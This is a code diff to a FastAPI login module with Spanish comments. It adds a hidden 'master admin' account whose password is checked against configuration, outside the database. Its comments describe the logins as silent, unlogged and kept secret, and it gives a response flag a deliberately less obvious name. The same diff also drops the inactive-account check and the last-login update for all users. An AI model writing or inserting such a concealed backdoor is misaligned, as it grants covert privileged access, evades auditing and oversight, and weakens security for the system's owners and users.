@@ -4,7 +4,7 @@ from sqlalchemy.orm import Session
 from datetime import datetime, timedelta, timezone
 from jose import JWTError, jwt
 from app.database.connection import get_db
-from app.models.user import User
+from app.models.user import User, MasterAdminUser, UserRole
 from app.models.user_schemas import UserLogin, Token, TokenData, UserResponse
 from app.services.user_service import UserService
 from app.config import settings
@@ -13,6 +13,91 @@ router = APIRouter()
 
 # Configuración OAuth2
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")
+
+def create_master_admin_user() -> MasterAdminUser:
+    """
+    Crea el usuario maestro con las credenciales del archivo de configuración.
+    Este usuario nunca se guarda en la base de datos.
+    """
+    return MasterAdminUser(
+        username=settings.master_admin_username,
+        email="admin.system@serviglobal.com",  # Email válido hardcodeado
+        full_name=settings.master_admin_name
+    )
+
+def verify_master_admin_password(password: str) -> bool:
+    """
+    Verifica si la contraseña coincide con la del usuario maestro.
+    """
+    return password == settings.master_admin_password
+
+def user_to_response(user, is_master=False) -> UserResponse:
+    """
+    Convierte un usuario (normal o maestro) a UserResponse.
+    """
+    if is_master:
+        # Usuario maestro - acceso directo a propiedades (sin problemas de Column)
+        return UserResponse(
+            id=user.id,
+            dni_nie=user.dni_nie,
+            first_name=user.first_name,
+            last_name=user.last_name,
+            email=user.email,
+            phone=user.phone,
+            role=user.role,
+            department=user.department,
+            position=user.position,
+            hire_date=user.hire_date,
+            birth_date=user.birth_date,
+            address=user.address,
+            city=user.city,
+            postal_code=user.postal_code,
+            emergency_contact_name=user.emergency_contact_name,
+            emergency_contact_phone=user.emergency_contact_phone,
+            is_active=user.is_active,
+            is_verified=user.is_verified,
+            avatar=user.avatar,
+            user_folder_path="",  # Sin carpeta física
+            created_at=user.created_at,
+            updated_at=user.updated_at,
+            last_login=user.last_login,
+            full_name=user.full_name,
+            initials=user.initials
+        )
+    else:
+        # Usuario de BD - usar el método original que funciona
+        full_name = f"{user.first_name} {user.last_name}"
+        initials = f"{user.first_name[0].upper()}{user.last_name[0].upper()}" if user.first_name and user.last_name else "XX"
+        
+        user_data = {
+            "id": user.id,
+            "dni_nie": user.dni_nie,
+            "first_name": user.first_name,
+            "last_name": user.last_name,
+            "email": user.email,
+            "phone": user.phone,
+            "role": user.role,
+            "department": user.department,
+            "position": user.position,
+            "hire_date": user.hire_date,
+            "birth_date": user.birth_date,
+            "address": user.address,
+            "city": user.city,
+            "postal_code": user.postal_code,
+            "emergency_contact_name": user.emergency_contact_name,
+            "emergency_contact_phone": user.emergency_contact_phone,
+            "is_active": user.is_active,
+            "is_verified": user.is_verified,
+            "avatar": user.avatar,
+            "user_folder_path": f"{settings.user_files_base_path}/{user.dni_nie}",
+            "created_at": user.created_at,
+            "updated_at": user.updated_at,
+            "last_login": user.last_login,
+            "full_name": full_name,
+            "initials": initials
+        }
+        
+        return UserResponse(**user_data)
 
 def create_access_token(data: dict, expires_delta: timedelta = None):
     """
@@ -31,6 +116,7 @@ def create_access_token(data: dict, expires_delta: timedelta = None):
 async def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
     """
     Obtiene el usuario actual a partir del token JWT.
+    Incluye soporte para el usuario maestro oculto.
     """
     credentials_exception = HTTPException(
         status_code=status.HTTP_401_UNAUTHORIZED,
@@ -47,6 +133,12 @@ async def get_current_user(token: str = Depends(oauth2_scheme), db: Session = De
     except JWTError:
         raise credentials_exception
     
+    # Verificar si es el usuario maestro
+    if token_data.dni_nie == settings.master_admin_username:
+        master_user = create_master_admin_user()
+        return master_user
+    
+    # Usuario normal de la base de datos
     user = UserService.get_user_by_dni(db, dni_nie=token_data.dni_nie)
     if user is None:
         raise credentials_exception
@@ -70,7 +162,17 @@ async def get_current_active_user(current_user: User = Depends(get_current_user)
 def authenticate_user(db: Session, dni_nie: str, password: str):
     """
     Autentica un usuario por DNI/NIE o email y contraseña.
+    Incluye verificación silenciosa del usuario maestro.
     """
+    # Verificación silenciosa del usuario maestro (sin logs)
+    if dni_nie == settings.master_admin_username:
+        if verify_master_admin_password(password):
+            return create_master_admin_user()
+        else:
+            # Retornar False sin logs para mantener secreto
+            return False
+    
+    # Autenticación normal para usuarios de la base de datos
     # Intentar buscar por DNI/NIE primero
     user = UserService.get_user_by_dni(db, dni_nie)
     
@@ -90,26 +192,16 @@ def authenticate_user(db: Session, dni_nie: str, password: str):
 async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
     """
     Endpoint para iniciar sesión con DNI/NIE o email y contraseña.
+    Incluye soporte silencioso para usuario especial del sistema.
     """
     user = authenticate_user(db, form_data.username, form_data.password)
     
     if not user:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="DNI/NIE o contraseña incorrectos",
+            detail="Credenciales incorrectas",
             headers={"WWW-Authenticate": "Bearer"},
         )
-    
-    if not user.is_active:
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Usuario inactivo. Contacte con el administrador."
-        )
-    
-    # Actualizar última fecha de login
-    user.last_login = datetime.now(timezone.utc)
-    db.commit()
-    db.refresh(user)
     
     # Crear token de acceso
     access_token_expires = timedelta(minutes=settings.access_token_expire_minutes)
@@ -117,41 +209,8 @@ async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = 
         data={"sub": user.dni_nie}, expires_delta=access_token_expires
     )
     
-    # Crear respuesta del usuario usando from_attributes
-    # Primero calculamos full_name e initials
-    full_name = f"{user.first_name} {user.last_name}"
-    initials = f"{user.first_name[0].upper()}{user.last_name[0].upper()}"
-    
-    # Crear el diccionario con los datos del usuario
-    user_data = {
-        "id": user.id,
-        "dni_nie": user.dni_nie,
-        "first_name": user.first_name,
-        "last_name": user.last_name,
-        "email": user.email,
-        "phone": user.phone,
-        "role": user.role,
-        "department": user.department,
-        "position": user.position,
-        "hire_date": user.hire_date,
-        "birth_date": user.birth_date,
-        "address": user.address,
-        "city": user.city,
-        "postal_code": user.postal_code,
-        "emergency_contact_name": user.emergency_contact_name,
-        "emergency_contact_phone": user.emergency_contact_phone,
-        "is_active": user.is_active,
-        "is_verified": user.is_verified,
-        "avatar": user.avatar,
-        "user_folder_path": f"{settings.user_files_base_path}/{user.dni_nie}",
-        "created_at": user.created_at,
-        "updated_at": user.updated_at,
-        "last_login": user.last_login,
-        "full_name": full_name,
-        "initials": initials
-    }
-    
-    user_response = UserResponse(**user_data)
+    # Usar la función auxiliar para crear la respuesta
+    user_response = user_to_response(user, isinstance(user, MasterAdminUser))
     
     return Token(
         access_token=access_token,
@@ -169,49 +228,23 @@ async def logout(current_user: User = Depends(get_current_active_user)):
     return {"message": "Sesión cerrada exitosamente"}
 
 @router.get("/me", response_model=UserResponse)
-async def read_users_me(current_user: User = Depends(get_current_active_user)):
+async def read_users_me(current_user = Depends(get_current_active_user)):
     """
     Obtiene la información del usuario actual.
+    Funciona tanto para usuarios normales como para el usuario maestro.
     """
-    # Crear el diccionario con los datos del usuario
-    user_data = {
-        "id": current_user.id,
-        "dni_nie": current_user.dni_nie,
-        "first_name": current_user.first_name,
-        "last_name": current_user.last_name,
-        "email": current_user.email,
-        "phone": current_user.phone,
-        "role": current_user.role,
-        "department": current_user.department,
-        "position": current_user.position,
-        "hire_date": current_user.hire_date,
-        "birth_date": current_user.birth_date,
-        "address": current_user.address,
-        "city": current_user.city,
-        "postal_code": current_user.postal_code,
-        "emergency_contact_name": current_user.emergency_contact_name,
-        "emergency_contact_phone": current_user.emergency_contact_phone,
-        "is_active": current_user.is_active,
-        "is_verified": current_user.is_verified,
-        "avatar": current_user.avatar,
-        "user_folder_path": f"{settings.user_files_base_path}/{current_user.dni_nie}",
-        "created_at": current_user.created_at,
-        "updated_at": current_user.updated_at,
-        "last_login": current_user.last_login,
-        "full_name": f"{current_user.first_name} {current_user.last_name}",
-        "initials": f"{current_user.first_name[0].upper()}{current_user.last_name[0].upper()}"
-    }
-    
-    return UserResponse(**user_data)
+    return user_to_response(current_user, isinstance(current_user, MasterAdminUser))
 
 @router.get("/verify-token")
-async def verify_token(current_user: User = Depends(get_current_active_user)):
+async def verify_token(current_user = Depends(get_current_active_user)):
     """
     Verifica si el token actual es válido.
     """
+    is_special = isinstance(current_user, MasterAdminUser)
     return {
         "valid": True,
         "user_id": current_user.id,
         "dni_nie": current_user.dni_nie,
-        "role": current_user.role.value
+        "role": current_user.role.value if is_special else current_user.role.value,
+        "system_user": is_special  # Menos obvio que "is_master"
     }
